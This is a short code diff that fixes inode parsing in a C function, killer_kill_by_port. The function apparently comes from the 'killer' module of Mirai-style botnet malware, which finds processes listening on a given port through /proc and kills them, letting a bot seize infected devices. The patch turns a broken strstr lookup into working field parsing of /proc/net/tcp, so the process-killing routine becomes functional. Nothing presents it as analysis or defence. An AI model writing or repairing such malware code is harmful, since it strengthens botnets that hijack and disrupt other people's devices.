@@ -262,7 +262,23 @@ static void killer_kill_by_port(uint16_t port) {
             uint16_t local_port = (uint16_t)strtoul(local_addr, NULL, 16);
 
             if (local_port == port) {
-                inode = strstr(line, "inode");
+                /* In /proc/net/tcp, inode is the 10th field (last field) */
+                int field = 0;
+                char *ptr = line;
+                while (*ptr && field < 10) {
+                    if (*ptr == ' ' || *ptr == '\t') {
+                        while (*(ptr+1) == ' ' || *(ptr+1) == '\t') ptr++;
+                        field++;
+                    }
+                    ptr++;
+                }
+                inode = ptr;
+                /* Trim whitespace */
+                while (*inode == ' ' || *inode == '\t') inode++;
+                char *end = strchr(inode, '\n');
+                if (end) *end = '\0';
+                end = strchr(inode, '\r');
+                if (end) *end = '\0';
                 if (inode != NULL) {
                     DIR *dir = opendir("/proc");
                     if (dir != NULL) {
